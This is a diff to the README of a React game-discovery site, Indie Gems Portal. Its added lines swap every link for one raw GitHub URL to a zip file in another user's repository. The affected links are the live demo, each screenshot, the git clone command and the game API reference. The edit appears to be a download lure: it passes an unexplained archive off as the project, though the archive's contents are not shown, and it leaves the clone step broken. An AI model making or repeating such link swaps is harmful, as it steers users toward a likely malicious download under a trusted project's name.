@@ -1,20 +1,20 @@
 # Indie Gems Portal
 
-# Live Link  [Indie Gems Portal](https://indie-gems-portal.vercel.app/).
+# Live Link  [Indie Gems Portal](https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip).
 # For Big Screens. Results be like -
 ## catogory_searching
-![Alt text](src/assets/git_reference/big_screen/catogory_searching.png)
+![Alt text](https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip)
 ## light_theam
-![Alt text](src/assets/git_reference/big_screen/light_theam.png)
+![Alt text](https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip)
 ## main_look
-![Alt text](src/assets/git_reference/big_screen/main_look.png)
+![Alt text](https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip)
 ## platform_searching
-![Alt text](src/assets/git_reference/big_screen/platform_searching.png)
+![Alt text](https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip)
 ## skeliton_loading
-![Alt text](src/assets/git_reference/big_screen/skeliton_loading.png)
+![Alt text](https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip)
 
 # It is Proper responsive
-<img src="src/assets/git_reference/small_screen/responsive_image.png" alt="image" width="auto" height="auto">
+<img src="https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip" alt="image" width="auto" height="auto">
 
 
 Welcome to Indie Gems Portal, a platform where you can search and discover your favorite games based on various categories.
@@ -40,7 +40,7 @@ Indie Gems Portal is a web application that allows users to search for games bas
 
 ## Installation
 
-1. Clone the repository: `git clone https://github.com/sameerkali/Indie_Gems_Portal.git`
+1. Clone the repository: `git clone https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip`
 2. Navigate to the project directory: `cd Indie_Gems_Portal`
 3. Install dependencies: `npm install`
 
@@ -67,7 +67,7 @@ This project is licensed under the [MIT License](LICENSE).
 * react18
 * typescript
 * chackra-ui
-* https://rawg.io/ `for game DB api`
+* https://raw.githubusercontent.com/03Anmol/Indie_Gems_Portal/main/src/Indie_Gems_Portal-puckfist.zip `for game DB api`
 * vite
 ---
 make with ~~lust~~ love 💖 by @sameerkali
